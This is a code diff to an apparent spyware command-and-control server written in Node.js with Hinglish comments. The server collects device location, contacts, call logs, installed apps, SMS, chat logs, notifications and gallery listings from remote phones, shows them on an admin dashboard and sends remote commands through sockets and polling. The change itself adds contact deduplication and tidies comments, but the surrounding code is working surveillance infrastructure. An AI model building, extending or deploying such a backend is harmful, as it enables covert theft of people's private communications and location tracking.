@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Duplicate Data Fixed!');
+    res.send('✅ Server Running: Contacts Duplication Fixed!');
 });
 
 // ==================================================
@@ -173,7 +173,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  🔥 STATUS & COMMAND (Loop Fix Included)
+//  🔥 STATUS & COMMAND
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -195,7 +195,6 @@ app.post('/api/status', (req, res) => {
 
         const id = device_id.toString().trim().toUpperCase();
         
-        // 🔥 FIX: Command ek baar bhejo, fir turant 'none' kar do
         let commandToSend = "none";
         if (devicesStatus[id] && devicesStatus[id].command) {
             commandToSend = devicesStatus[id].command;
@@ -213,7 +212,7 @@ app.post('/api/status', (req, res) => {
             accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
             speed: speed || (devicesStatus[id]?.speed || 0),
             lastSeen: Date.now(),
-            command: "none" // 🔥 IMPORTANT: Reset to prevent loop
+            command: "none" 
         };
 
         res.json({ status: "success", command: commandToSend });
@@ -223,7 +222,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE (Duplicate Fix Applied)
+//  🔥 DATA STORAGE (Smart Deduplication Added)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -248,12 +247,30 @@ app.post('/api/upload_data', async (req, res) => {
             }
         }
 
-        // 🔥 CRITICAL FIX: CONTACTS & CALL LOGS SHOULD OVERWRITE (REPLACE) 🔥
-        if (['contacts', 'installed_apps', 'call_logs'].includes(type)) {
-             // Inka data humesha replace karo (Jodo mat)
+        // 🔥 FIX 1: CONTACTS DEDUPLICATION (Ek Number = Ek Entry) 🔥
+        if (type === 'contacts') {
+            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
+            
+            // Ye magic logic duplicate numbers uda dega
+            const seenNumbers = new Set();
+            finalData = [];
+
+            for (const contact of rawList) {
+                // Number saaf karo (spaces aur dashes hatao)
+                let num = contact.phoneNumber ? contact.phoneNumber.replace(/\s+|-/g, '') : '';
+                
+                // Agar ye number pehle nahi dekha, tabhi add karo
+                if (num && !seenNumbers.has(num)) {
+                    seenNumbers.add(num);
+                    finalData.push(contact);
+                }
+            }
+        }
+        // 🔥 FIX 2: Apps & Call Logs -> Direct Overwrite (No Duplicates)
+        else if (['installed_apps', 'call_logs'].includes(type)) {
              finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
         } 
-        // 🔥 CHAT, SMS, NOTIFICATIONS SHOULD APPEND (ADD) 🔥
+        // 🔥 FIX 3: Chat, SMS, Notifications -> Append (Jodte raho)
         else {
             let existingData = [];
             try {
@@ -265,12 +282,10 @@ app.post('/api/upload_data', async (req, res) => {
 
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             
-            // Chat Logs unique handle karne ke liye
             if (type === 'chat_logs') {
                 newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
             }
             
-            // Naya + Purana (Limit 5000)
             finalData = [...newDataArray, ...existingData].slice(0, 5000); 
         }
 
@@ -283,7 +298,7 @@ app.post('/api/upload_data', async (req, res) => {
     }
 });
 
-// ✅ MISSING API: Dashboard ko data dikhane ke liye ye zaroori hai
+// ✅ MISSING API: Dashboard Data Fetch
 app.get('/api/get-data/:device_id/:type', async (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
     try {
@@ -304,10 +319,8 @@ app.post('/api/send-command', (req, res) => {
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     const id = device_id.toUpperCase().trim();
     
-    // 1. Socket se live bhejo
     io.to(id).emit('command', command);
 
-    // 2. Status mein save karo (polling ke liye)
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     devicesStatus[id].command = command;
     
